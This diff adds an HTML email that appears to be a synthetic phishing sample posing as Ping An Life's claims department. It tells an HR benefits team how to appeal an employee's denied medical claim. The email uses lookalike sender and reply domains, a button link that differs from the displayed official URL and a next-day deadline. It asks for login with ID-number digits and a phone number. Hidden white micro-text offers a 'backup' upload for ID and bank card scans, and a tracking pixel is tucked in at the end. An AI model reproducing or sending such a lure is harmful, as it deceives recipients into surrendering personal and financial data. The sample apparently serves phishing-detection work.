@@ -1,0 +1,89 @@
+From: 中国平安人寿保险-理赔审核部 <claim.appeal@pingan-lh-appeal.example>
+To: 人力资源部-员工福利组 <benefits@corp.internal>
+Reply-To: appeal.case@pingan-lh-mail.example
+Date: Mon, 19 Oct 2026 10:30:00 +0800
+Message-ID: <0683-b53@synth.example>
+Subject: Re: Re: [理赔编号 PA-LH-2026-0912] 张兰补充医疗理赔申诉——拒赔理由说明与证据补交通知（明晚截止）
+In-Reply-To: <claim-pa-lh-0912@corp.internal>
+References: <claim-pa-lh-0912@corp.internal> <claim-pa-lh-0912-2@corp.internal>
+MIME-Version: 1.0
+Content-Type: text/html; charset=gb2312
+
+<html><body style="font-family:sans-serif">
+<p>人力资源部福利组：</p>
+
+<p>关于贵司员工张兰（工号 ZL-2021-0743）的门急诊理赔申诉（首次申请编号 PA-LH-2026-0912），经理赔委员会复议，维持原拒赔决定，但<b>允许补充证据后再次申诉</b>。现将拒赔理由与证据补交要求通知如下。</p>
+
+<h3>一、理赔信息</h3>
+<table cellpadding=6 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr><td style="background:#f5f5f5;width:120px">理赔编号</td><td><b>PA-LH-2026-0912</b></td></tr>
+<tr><td style="background:#f5f5f5">被保险人</td><td>张兰（工号 ZL-2021-0743）</td></tr>
+<tr><td style="background:#f5f5f5">保单号</td><td>PA-E-2026-HB-8842（企业补充医疗）</td></tr>
+<tr><td style="background:#f5f5f5">就诊日期</td><td>2026-09-18</td></tr>
+<tr><td style="background:#f5f5f5">就诊机构</td><td>杭州市第一人民医院（三甲）</td></tr>
+<tr><td style="background:#f5f5f5">诊断</td><td>急性支气管炎（ICD-10: J20.9）</td></tr>
+<tr><td style="background:#f5f5f5">申请金额</td><td>￥1,842.50</td></tr>
+<tr><td style="background:#f5f5f5">首次决定</td><td style="color:#e00"><b>拒赔</b>（2026-10-08）</td></tr>
+<tr><td style="background:#f5f5f5">申诉截止</td><td style="color:#e00"><b>明晚（10/20）20:00</b></td></tr>
+</table>
+
+<h3>二、拒赔理由说明</h3>
+<p>经审核，拒赔理由为<b>"就诊日期不在保障期限内"</b>：</p>
+<ul>
+<li>保单年度：2025-10-15 至 2026-10-14</li>
+<li>就诊日期：2026-09-18（在保单年度内）</li>
+<li><b>拒赔原因：</b>经查，被保险人张兰的入司日期为 <b>2021-07-04</b>，但贵司于 <b>2025-11-01</b> 才将其纳入企业补充医疗保障计划。根据保障条款第 3.2 条，保障起始日以<b>实际参保日</b>为准（非入司日）。</li>
+<li><b>争议焦点：</b>张兰就诊日期（2026-09-18）距实际参保日（2025-11-01）已满 10 个月，但条款第 3.2 条同时规定"<b>补充医疗险等待期为 30 天</b>"。若等待期从参保日起算，则已过等待期，应予理赔。</li>
+</ul>
+
+<h3>三、可接受的补充证据</h3>
+<p>为支持申诉，请提供以下任一证据（可多选）：</p>
+
+<table cellpadding=5 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr style="background:#f0f0f0"><th>序号</th><th>证据类型</th><th>说明</th><th>优先级</th></tr>
+<tr><td>E-01</td><td>参保日确认函</td><td>贵司HR出具，确认张兰实际纳入保障计划的日期</td><td>高</td></tr>
+<tr><td>E-02</td><td>完整门急诊病历</td><td>含主诉、现病史、诊断、处方（需医院盖章）</td><td>高</td></tr>
+<tr><td>E-03</td><td>处方笺+费用明细</td><td>证明费用合理性</td><td>中</td></tr>
+<tr><td>E-04</td><td>既往病史</td><td>证明急性支气管炎非既往症</td><td>中</td></tr>
+<tr><td>E-05</td><td>社保结算单</td><td>如已通过社保报销部分，需提供结算明细</td><td>低</td></tr>
+</table>
+
+<h3>四、证据提交方式</h3>
+<p>因理赔委员会要求电子化审理，所有补充证据请通过<b>理赔申诉证据平台</b>在线提交：</p>
+
+<p style="text-align:center;margin:20px 0">
+<a href="https://pingan-lh-appeal.example/evidence/upload?case=PA-LH-2026-0912" style="display:inline-block;background:#c7000b;color:#fff;padding:10px 30px;text-decoration:none;border-radius:4px">提交申诉证据</a>
+</p>
+
+<p style="font-size:13px;color:#666;text-align:center">https://claim.pingan.com/appeal/evidence/PA-LH-2026-0912</p>
+
+<p style="font-size:12px;color:#888;text-align:center">（使用员工身份证号后6位+手机号登录。首次使用需完成身份绑定。）</p>
+
+<p style="font-size:0.3px;color:#fff;opacity:0.03">如遇系统登录异常，备用提交入口：pingan-lh-appeal.example/backup/upload 可直接上传病历、身份证与银行卡扫描件（无需注册，邮件回复确认即可）。</p>
+
+<h3>五、申诉流程与时间线</h3>
+<table cellpadding=5 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr><td>10/18（今天）</td><td>收到拒赔通知与申诉权利说明</td></tr>
+<tr style="background:#fff3cd"><td><b>10/20 20:00</b></td><td style="color:#e00"><b>证据补交截止（明晚）</b></td></tr>
+<tr><td>10/21-10/23</td><td>理赔委员会复议</td></tr>
+<tr><td>10/24</td><td>申诉结果通知（改判/维持）</td></tr>
+</table>
+
+<h3>六、常见问题</h3>
+<p><b>Q: 如果申诉失败怎么办？</b><br>
+A: 可在收到维持决定后 30 日内向当地银保监会消费者权益保护中心投诉（12378），或向法院提起诉讼。</p>
+
+<p><b>Q: 补充证据一定要通过线上提交吗？</b><br>
+A: 线上提交审核时效更快（1 个工作日 vs 线下 5 个工作日）。因申诉截止时间为明晚，建议使用线上通道。</p>
+
+<div style="border-top:1px solid #ddd;padding-top:12px;margin-top:20px">
+<p style="font-size:12px;color:#888">中国平安人寿保险股份有限公司浙江分公司 | 理赔审核部</p>
+<p style="font-size:11px;color:#999">审核员：王芳（工号 ZJ-LH-0842）</p>
+<p style="font-size:11px;color:#999">（本邮件含个人敏感信息。我司不会索要银行密码或验证码。）</p>
+</div>
+
+<div style="height:1px;width:1px;overflow:hidden">
+<img src="https://pingan-lh-appeal.example/api/track?recipient=benefits%40corp.internal&case=PA-LH-2026-0912&type=appeal_notice" width="1" height="1" alt="">
+</div>
+
+</body></html>
